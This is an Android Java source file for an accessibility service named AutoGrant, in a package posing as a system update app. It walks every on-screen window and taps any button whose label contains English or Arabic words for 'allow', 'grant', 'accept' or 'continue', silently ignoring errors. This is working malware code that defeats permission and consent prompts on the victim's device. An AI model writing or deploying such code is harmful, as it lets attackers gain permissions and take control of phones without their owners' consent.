package com.sysupdate.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AutoGrant extends AccessibilityService {

    private static final String[] OK_TEXTS = {
        "allow", "permit", "grant", "ok", "yes", "accept", "continue",
        "السماح", "سماح", "موافق", "حسناً", "حسنا", "نعم", "قبول", "متابعة",
        "تفعيل", "أوافق", "الموافقة", "تأكيد", "بدء", "التالي", "تمكين"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            click(root);
        } catch (Exception e) {}
    }

    private void click(AccessibilityNodeInfo node) {
        if (node == null) return;
        try {
            if (node.isClickable()) {
                String txt = node.getText() == null ? "" : node.getText().toString().toLowerCase();
                String desc = node.getContentDescription() == null ? "" : node.getContentDescription().toString().toLowerCase();
                for (String k : OK_TEXTS) {
                    String kl = k.toLowerCase();
                    if (txt.contains(kl) || desc.contains(kl)) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                click(node.getChild(i));
            }
        } catch (Exception e) {}
    }

    @Override
    public void onInterrupt() {}
}
